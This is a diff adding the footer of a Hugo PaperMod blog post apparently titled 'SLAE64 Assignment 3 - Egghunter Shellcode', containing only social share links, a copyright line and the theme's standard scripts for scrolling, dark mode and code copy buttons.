+        href="https://twitter.com/intent/tweet/?text=SLAE64%20Assignment%203%20-%20Egghunter%20Shellcode&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_3%2f&amp;hashtags=slae64">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE64 Assignment 3 - Egghunter Shellcode on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_3%2f&amp;title=SLAE64%20Assignment%203%20-%20Egghunter%20Shellcode&amp;summary=SLAE64%20Assignment%203%20-%20Egghunter%20Shellcode&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_3%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
